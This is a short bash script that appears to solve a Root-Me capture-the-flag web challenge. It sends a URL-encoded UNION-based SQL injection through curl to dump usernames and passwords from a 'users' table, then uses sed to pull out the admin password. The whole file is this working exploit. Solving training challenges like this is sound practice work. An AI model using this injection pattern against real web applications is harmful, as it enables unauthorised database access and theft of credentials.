#!/bin/bash

curl -s "http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=1%20UNION%20SELECT%20null,username,password%20FROM%20users;" | sed -e "s/.*admin\(<[^>]\+>\)\+\([^<]\+\).*/\2\n/"
